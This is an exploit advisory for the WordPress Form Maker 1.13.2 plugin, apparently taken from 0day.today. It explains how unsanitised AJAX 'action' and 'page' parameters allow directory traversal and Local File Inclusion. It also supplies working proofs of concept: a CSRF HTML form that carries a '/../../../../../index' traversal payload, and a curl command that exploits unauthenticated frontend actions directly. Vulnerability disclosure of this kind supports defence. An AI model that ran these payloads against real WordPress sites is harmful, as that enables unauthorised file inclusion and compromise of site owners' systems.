@@ -1,0 +1,129 @@
+id: 32494
+date: 04/06/2019
+title: WordPress Form Maker 1.13.2 Cross Site Request Forgery / Local File Inclusion Vulnerabilities
+author: panVagenas
+cves: 
+
+# Title: Form Maker by WD [CSRF / LFI]
+# Exploit Author: Panagiotis Vagenas
+# Vendor Homepage: http://web-dorado.com/
+# Software Link: https://wordpress.org/plugins/form-maker
+# Version: 1.13.2
+# Tested on: WordPress 5.1
+
+Description
+-----------
+
+Plugin implements the following AJAX actions:
+
+- `generete_csv`
+- `generete_xml`
+- `formmakerwdcaptcha`
+- `formmakerwdmathcaptcha`
+- `product_option`
+- `FormMakerEditCountryinPopup`
+- `FormMakerMapEditinPopup`
+- `FormMakerIpinfoinPopup`
+- `show_matrix`
+- `FormMakerSubmits`
+- `FormMakerSQLMapping`
+- `select_data_from_db`
+- `manage_fm`
+- `FMShortocde`
+
+All of them call the function `form_maker_ajax`. This function
+dynamicaly loads a file defined in `$_GET['action']` or
+`$_POST['action']` if the former is not defined. Because of the way
+WordPress defines the AJAX action a user could define the plugin action
+in the `$_GET['action']` and AJAX action in `$_POST['action']`.
+Leveraging that and the fact that no sanitization is performed on the
+`$_GET['action']`, a malicious actor can perform a CSRF attack to load a
+file using directory traversal thus leading to Local File Inclusion
+vulnerability.
+
+Plugin also registers the following AJAX actions:
+
+- `paypal_info`
+- `checkpaypal`
+
+Those seems like the are only available to PRO version users, yet they
+also are vulnerable to this attack.
+
+Additionally the following AJAX actions are registered in PRO version:
+
+- `get_frontend_stats`
+- `frontend_show_map`
+- `frontend_show_matrix`
+- `frontend_paypal_info`
+- `frontend_generate_csv`
+- `frontend_generate_xml`
+
+Those have the function `form_maker_ajax_frontend` as a callback. All of
+them are vulnerable to the aforementioned attack. What's more
+interesting about those is the fact that are available to non-registered
+users also, making this attack directly exploitable, without using a
+CSRF attack. In this case the vulnerable param is `$_REQUEST['page']`.
+
+PoC
+---
+
+### Using a CSRF attack
+
+```html
+<form method="post"
+action="http://wp-plugin-csrf.dev/wp-admin/admin-ajax.php?action=/../../../../../index">
+    <label>AJAX action:
+        <select name="action">
+            <optgroup label="Free version">
+                <option value="generete_csv">generete_csv</option>
+                <option value="generete_xml">generete_xml</option>
+                <option
+value="formmakerwdcaptcha">formmakerwdcaptcha</option>
+                <option
+value="formmakerwdmathcaptcha">formmakerwdmathcaptcha</option>
+                <option value="product_option">product_option</option>
+                <option
+value="FormMakerEditCountryinPopup">FormMakerEditCountryinPopup</option>
+                <option
+value="FormMakerMapEditinPopup">FormMakerMapEditinPopup</option>
+                <option
+value="FormMakerIpinfoinPopup">FormMakerIpinfoinPopup</option>
+                <option value="show_matrix">show_matrix</option>
+                <option value="FormMakerSubmits">FormMakerSubmits</option>
+                <option
+value="FormMakerSQLMapping">FormMakerSQLMapping</option>
+                <option
+value="select_data_from_db">select_data_from_db</option>
+                <option value="manage_fm">manage_fm</option>
+                <option value="FMShortocde">FMShortocde</option>
+            </optgroup>
+            <optgroup label="Pro Version">
+                <option value="paypal_info">paypal_info</option>
+                <option value="checkpaypal">checkpaypal</option>
+                <option
+value="get_frontend_stats">get_frontend_stats</option>
+                <option value="frontend_show_map">frontend_show_map</option>
+                <option
+value="frontend_show_matrix">frontend_show_matrix</option>
+                <option
+value="frontend_paypal_info">frontend_paypal_info</option>
+                <option
+value="frontend_generate_csv">frontend_generate_csv</option>
+                <option
+value="frontend_generate_xml">frontend_generate_xml</option>
+            </optgroup>
+        </select>
+    </label>
+    <button type="submit" value="Submit">Submit</button>
+</form>
+```
+
+### Without leveraging the CSRF vulnerability
+
+```sh
+curl 'http://wp-plugin-csrf.dev/wp-admin/admin-ajax.php' \
+    -d 'action=get_frontend_stats&page=/../../../../../index'
+```
+
+
+#  0day.today [2023-03-21]  #
